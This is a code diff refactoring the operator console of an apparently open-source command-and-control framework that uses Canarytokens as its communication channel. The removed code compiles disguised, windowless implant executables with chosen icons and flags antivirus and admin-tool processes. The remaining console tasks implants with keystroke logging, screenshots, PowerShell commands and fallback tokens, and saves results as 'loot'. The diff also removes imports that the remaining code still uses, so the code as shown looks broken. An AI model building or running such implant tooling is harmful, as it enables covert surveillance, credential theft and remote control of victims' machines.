@@ -3,28 +3,24 @@
 
 # Imports
 import base64
-import fileinput
-import itertools
 import os
 import platform
 import re
-import shutil
-import sys
-import threading
-import time
 
-import PyInstaller.__main__
 import requests
 from bs4 import BeautifulSoup
+# Clear screen on start for colorama to work in Windows shell
+from colorama import init
 from fake_useragent import UserAgent
-#Clear screen on start for colorama to work in Windows shell
-from colorama import init, Fore
+
+
 init(convert=True)
 os.system('cls' if os.name == 'nt' else 'clear')
 
 from resources.modules.helpmenu import *
 from resources.modules.postExp import *
-
+from resources.modules.genimplant import *
+from resources.modules.processhighlight import *
 
 # Globals
 ua = UserAgent()
@@ -46,15 +42,14 @@ chunkedlen = 0
 screenshotdone = False
 ps = False
 waitForKeys = False
-lootpath = "loot/template/"
+lootpath = ""
 
 
 def generate_canarytoken():
-
     # Check if template loot dir exists. If not, create it
-    lootdir = os.path.dirname(lootpath)
-    if not os.path.exists(lootdir):
-        os.makedirs(lootdir)
+    #lootdir = os.path.dirname(lootpath)
+    #if not os.path.exists(lootdir):
+    #    os.makedirs(lootdir)
 
     stripedUA = ua.random
 
@@ -146,48 +141,6 @@ def chunkAnimate():
         time.sleep(0.25)
 
 
-
-def highlightprocesses(processlist):
-    # Thanks to ars3n11 https://github.com/ars3n11/Aggressor-Scripts/blob/master/ProcessTree.cna for process list
-    # TODO ADD TREE FUNCTIONALITY
-    print("\n")
-    try:
-        avfile = open("resources/processlist/av.txt", "r")
-        avlist = avfile.read().split(" ")
-        avfile.close()
-
-        explorerWinlogon = ["explorer.exe", "winlogon.exe"]
-        browserlist = ["chrome.exe", "firefox.exe", "iexplore.exe", "opera.exe", "safari.exe", "msedge.exe",
-                       "MicrosoftEdgeCP.exe"]
-
-        admintoolfile = open("resources/processlist/admintools.txt", "r")
-        admintoollist = admintoolfile.read().split(" ")
-        admintoolfile.close()
-
-        list = processlist.splitlines()
-
-        for line in list:
-            process = line.split(" ")[0]
-            if process in avlist:
-                print(Fore.RED + line + Fore.RESET)
-
-            elif process in explorerWinlogon:
-                print(Fore.BLUE + line + Fore.RESET)
-
-            elif process in browserlist:
-                print(Fore.GREEN + line + Fore.RESET)
-
-            elif process in admintoollist:
-                print(Fore.YELLOW + line + Fore.RESET)
-
-            else:
-                print(Fore.RESET + line)
-
-    except Exception as e:
-        print(Fore.RED + "[-]" + Fore.RESET + " Error opening .txt files")
-        print(e)
-
-
 # Request to get results from command
 def getResults(lastdictsize):
     stripedUA = ua.random
@@ -195,6 +148,7 @@ def getResults(lastdictsize):
     doneChunked = False
     global screenshotdone
     screenshotdone = False
+    global lootpath
     global ps
 
     headers = {
@@ -202,7 +156,6 @@ def getResults(lastdictsize):
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
         "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Connection": "close",
         "Upgrade-Insecure-Requests": "1"}
-
 
     stringbuilder = ""
     chunkedlen = 0
@@ -350,9 +303,17 @@ def getResults(lastdictsize):
                     with open(lootpath + timestr + ".jpg", "wb") as f:
                         f.write(imgbytes)
                         f.close()
-                    print(Fore.GREEN + "\n[+]" + Fore.RESET + " Screenshot saved to " + lootpath + timestr + ".jpg")
-                    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token after screenshot...")
+                    print(Fore.GREEN + "\n\n[+]" + Fore.RESET + " Screenshot saved to " + lootpath + timestr + ".jpg")
+
+                    #To open screenshot after capturing it
+                    try:
+                        os.system("start " + lootpath + timestr + ".jpg")
+                    except:
+                        pass
+
+                    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Grabbing new token after screenshot...")
                     fallback()
+
                     return (1)
 
                 if cmd.startswith("res:"):
@@ -537,19 +498,27 @@ def keystrokes(keychoice):
 
 
 def fallback():
-    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating fallback token...")
-    global pwd
-    pwd = False
-    global oldtoken
-    oldtoken = url
-    generate_canarytoken()
-    print(Fore.BLUE + "[!]" + Fore.RESET + " Sending implant the new token...")
-    taskCommand("fallback:" + canaryManagementURL)
-    oldtoken = ""
-    global lastdictsize
-    lastdictsize = 1
-    wait_for_implant()
-    return
+    try:
+        print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating fallback token...")
+        global pwd
+        pwd = False
+        global oldtoken
+        oldtoken = url
+        generate_canarytoken()
+        print(Fore.BLUE + "[!]" + Fore.RESET + " Sending implant the new token...")
+        taskCommand("fallback:" + canaryManagementURL)
+        oldtoken = ""
+        global lastdictsize
+        lastdictsize = 1
+        wait_for_implant()
+        return
+
+    except Exception as e:
+        print(Fore.RED + "[-]" + Fore.RESET + " Error: " + str(e))
+        exc_type, exc_obj, exc_tb = sys.exc_info()
+        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
+        print(exc_type, fname, exc_tb.tb_lineno)
+        pass
 
 
 def screenshot():
@@ -563,6 +532,7 @@ def screenshot():
         "Upgrade-Insecure-Requests": "1"}
 
     response = requests.get(url, headers=headers)
+
 
 
 def killimplant(clean):
@@ -603,7 +573,6 @@ def killimplant(clean):
     print(Fore.BLUE + "[!]" + Fore.RESET + " Exiting... Bye!")
 
 
-
 def animate():
     for c in itertools.cycle(['[|] loading', '[/] loading.', '[-] loading..', '[\\] loading...']):
         if done:
@@ -611,131 +580,6 @@ def animate():
         sys.stdout.write('\r' + Fore.BLUE + c + Fore.RESET)
         sys.stdout.flush()
         time.sleep(0.25)
-
-
-def generateimplant():
-    global done
-    done = False
-    global lootpath
-    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating implant payload...")
-
-    implantType = str(input(Fore.BLUE + "[!]" + Fore.RESET + " Type of payload (`exe` or `py`): ")).lower().strip()
-
-    if ((implantType != "exe") and (implantType != "py")):
-        print(Fore.RED + "\n[-]" + Fore.RESET + "Invalid entry, enter either `exe` or `py`.")
-        print(implantType)
-        generateimplant()
-
-    if (implantType == "exe"):
-        # Check what OS we are running on
-
-        # more icons can be added to the /icon folder
-        icons = os.listdir("resources/icons/")
-        print(Fore.BLUE + "\n[!]" + Fore.RESET + " Available .ico files in:")
-        middle = int((len(icons) / 2))
-        for count, icon in enumerate(icons):
-            print(icon, end=" ")
-            if count == middle:
-                print("")
-
-        iconFile = str(input(Fore.BLUE + "\n\n[!]" + Fore.RESET + " Icon file for the exe (choose one of the above): "))
-
-        if iconFile in icons:
-            pass
-
-        else:
-            print(Fore.RED + "\n[-]" + Fore.RESET + " Invalid entry")
-            generateimplant()
-
-    name = str(input(Fore.BLUE + "[!]" + Fore.RESET + " Name for implant (exclude the extension): "))
-
-    if ((name == "") or ("\\" in name) or ("/" in name)) or ("." in name) or (
-    os.path.exists("payloads/" + name + "/")):
-        print(
-            Fore.RED + "\n[-]" + Fore.RESET + " Name cannot be empty or include forward/backslashes and name must be unique in /payloads folder.")
-        generateimplant()
-
-    print(Fore.BLUE + "\n[!]" + Fore.RESET + " Editing payload template with new token...")
-
-    if canaryManagementURL == "":
-        print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token...")
-        generate_canarytoken()
-
-    try:
-        # copy template to new file
-        os.mkdir("payloads/" + name)
-
-        # make and set loot directory
-        os.mkdir("loot/" + name)
-        lootpath = "loot/" + name + "/"
-
-        shutil.copyfile("implant.py", "payloads/" + name + "/" + name + "_implant.py")
-
-        with fileinput.FileInput("payloads/" + name + "/" + name + "_implant.py", inplace=True) as file:
-            for line in file:
-                sys.stdout.write(
-                    line.replace('canaryManagementURL = \"\"', 'canaryManagementURL = \"' + canaryManagementURL + '\"'))
-
-        fileinput.close()
-        print(Fore.BLUE + "[!]" + Fore.RESET + " Payload template successfully edited with new token...")
-
-
-    except Exception as e:
-        print(e)
-        exc_type, exc_obj, exc_tb = sys.exc_info()
-        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
-        print(exc_type, fname, exc_tb.tb_lineno)
-
-    implantdir = (f'payloads/{name}/')
-
-    # if exe chosen, compile with pyinstaller
-    if implantType == "exe":
-
-        print(Fore.BLUE + "[!]" + Fore.RESET + " Compiling payload with pyinstaller. Please wait...\n")
-
-        shutil.copyfile("resources/icons/" + iconFile, "payloads/" + name + "/" + iconFile)
-
-
-        # cool animation time
-        t = threading.Thread(target=animate)
-        t.start()
-
-        try:
-            PyInstaller.__main__.run([
-                '--name=%s' % name,
-                '--onefile',
-                '--clean',
-                '--icon=%s' % iconFile,
-                '--workpath=%s' % implantdir,
-                '--specpath=%s' % implantdir,
-                '--distpath=%s' % implantdir,
-                '--noconsole',
-                '--windowed',
-                '--log-level=%s' % "CRITICAL",
-                "payloads/" + name + "/" + name + "_implant.py",
-            ])
-
-            done = True
-
-            # clean up
-            os.remove("payloads/" + name + "/" + name + "_implant.py")
-            os.remove("payloads/" + name + "/" + name + ".spec")
-            os.remove("payloads/" + name + "/" + iconFile)
-
-            print(Fore.BLUE + "\n\n[!]" + Fore.RESET + " Created implant located at " + implantdir + name + ".exe!\n")
-
-        except Exception as e:
-            print(e)
-            exc_type, exc_obj, exc_tb = sys.exc_info()
-            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
-            print(exc_type, fname, exc_tb.tb_lineno)
-            done = True
-            return
-
-    else:
-        print(Fore.BLUE + "\n\n[!]" + Fore.RESET + " Created implant located at " + implantdir + name + ".py!\n")
-
-    wait_for_implant()
 
 
 def main():
@@ -746,12 +590,14 @@ def main():
         print(
             Fore.RED + "\n[-]" + Fore.RESET + " You can only generate an exe payload on a Windows system with pyinstaller. Current OS: " + currentOS + "\n")
         return
+
     global lastdictsize
     lastdictsize = 1
     global pwd
     global connected
-    #    global logging
     global url
+    global lootpath
+    lootpath ="loot/template/"
     global canaryManagementURL
     try:
         while True:
@@ -763,30 +609,9 @@ def main():
                 except:
                     cmd = input(Fore.GREEN + "[+]" + Fore.RESET + " CMD: ")
 
-            if cmd.lower() == "create-token":
-                if (canaryManagementURL != ""):
-                    print(
-                        Fore.RED + "\n[-]" + Fore.RESET + " Warning: You already have a token. If you create a new one, you will lose the old one.")
-                    while True:
-                        choice = input(Fore.RED + "[-]" + Fore.RESET + " Do you want to continue? (y/n): ").lower()
-                        if choice == "y" or choice == "yes":
-                            connected = False
-                            print(Fore.BLUE + "[!]" + Fore.RESET + " Generating Canarytoken...")
-                            lastdictsize = 1
-                            generate_canarytoken()
-                            wait_for_implant()
-                            break
-                        elif choice == "n" or choice == "no":
-                            break
-                        else:
-                            print(Fore.RED + "[-]" + Fore.RESET + " Invalid choice. Options are `y/n` or `yes/no`")
-                            continue
-                else:
-                    print(Fore.BLUE + "[!]" + Fore.RESET + " Generating Canarytoken...")
-                    generate_canarytoken()
-                    wait_for_implant()
 
-            elif cmd.lower() == "exit":
+
+            if cmd.lower() == "exit":
                 if connected == True:
                     print(Fore.RED + "[-]" + Fore.RESET + " You currently have an implant connected.")
                     print(
@@ -894,7 +719,6 @@ def main():
                         Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
 
 
-
             elif cmd.lower() == "kill clean":
                 if connected == True:
                     killimplant(True)
@@ -923,25 +747,54 @@ def main():
                 if (canaryManagementURL != ""):
                     print(
                         Fore.RED + "\n[-]" + Fore.RESET + " Warning: You already have a connected implant. If you create a new one, you will lose the old one.")
-                    while True:
-                        choice = input(Fore.RED + "[-]" + Fore.RESET + " Do you want to continue? (y/n): ").lower()
-                        if choice == "y" or choice == "yes":
-                            generateimplant()
-                            break
-                        elif choice == "n" or choice == "no":
-                            break
-                        else:
-                            print(Fore.RED + "[-]" + Fore.RESET + " Invalid choice. Options are `y/n` or `yes/no`")
-                            continue
+                    choice = input(Fore.RED + "[-]" + Fore.RESET + " Do you want to continue? (y/n): ").lower()
+                    if choice == "y" or choice == "yes":
+                        if canaryManagementURL == "":
+                            print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token...")
+                            generate_canarytoken()
+                        lootpath = generateimplant(canaryManagementURL)
+                        wait_for_implant()
+                        continue
+                    elif choice == "n" or choice == "no":
+                        continue
+                    else:
+                        print(Fore.RED + "[-]" + Fore.RESET + " Invalid choice. Options are `y/n` or `yes/no`")
+                        continue
                 else:
-                    generateimplant()
+                    if canaryManagementURL == "":
+                        print(Fore.BLUE + "\n[!]" + Fore.RESET + " Generating new token...")
+                        generate_canarytoken()
+                    lootpath = generateimplant(canaryManagementURL)
+                    wait_for_implant()
 
+            elif cmd.lower() == "create-token":
+                if (canaryManagementURL != ""):
+                    print(
+                        Fore.RED + "\n[-]" + Fore.RESET + " Warning: You already have a token. If you create a new one, you will lose the old one.")
+                    choice = input(Fore.RED + "[-]" + Fore.RESET + " Do you want to continue? (y/n): ").lower()
+                    if choice == "y" or choice == "yes":
+                        connected = False
+                        print(Fore.BLUE + "[!]" + Fore.RESET + " Generating Canarytoken...")
+                        lastdictsize = 1
+                        generate_canarytoken()
+                        wait_for_implant()
+                        continue
 
+                    elif choice == "n" or choice == "no":
+                        continue
+
+                    else:
+                        print(Fore.RED + "[-]" + Fore.RESET + " Invalid choice. Options are `y/n` or `yes/no`")
+                        continue
+                else:
+                    print(Fore.BLUE + "[!]" + Fore.RESET + " Generating Canarytoken...")
+                    generate_canarytoken()
+                    wait_for_implant()
 
             elif cmd.lower() == "canary-info":
                 if connected == True:
                     print(Fore.BLUE + "\n[!]" + Fore.RESET + " Token: " + token)
-                    print(Fore.BLUE + "[!]" + Fore.RESET + " URL Used: " + url)
+                    print(Fore.BLUE + "[!]" + Fore.RESET + " Alert URL: " + url)
                     print(Fore.BLUE + "[!]" + Fore.RESET + " Auth Token: " + authtoken)
                     print(Fore.BLUE + "[!]" + Fore.RESET + " Canary Management URL: " + canaryManagementURL + "\n")
 
@@ -977,11 +830,13 @@ def main():
                     if keychoice.lower() != "start" and keychoice.lower() != "stop" and keychoice.lower() != "fetch":
                         print(
                             Fore.RED + "[-]" + Fore.RESET + " Invalid option. Valid entry is: keystrokes `start` `stop` or `fetch`\n")
+                        continue
                     else:
                         keystrokes(keychoice)
                 else:
                     print(
                         Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
+                    continue
 
 
             elif cmd.lower().startswith("powershell "):
@@ -1003,6 +858,8 @@ def main():
                     print(
                         Fore.RED + "[-]" + Fore.RESET + " You must have an implant connected before you can use this command\n")
 
+            elif cmd=="":
+                continue
 
             # If none of the above is true
             else:
@@ -1010,8 +867,10 @@ def main():
 
     except Exception as e:
         print(Fore.RED + "[-]" + Fore.RESET + " Error: " + str(e))
+        exc_type, exc_obj, exc_tb = sys.exc_info()
+        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
+        print(exc_type, fname, exc_tb.tb_lineno)
         pass
-
 
 
 if __name__ == '__main__':
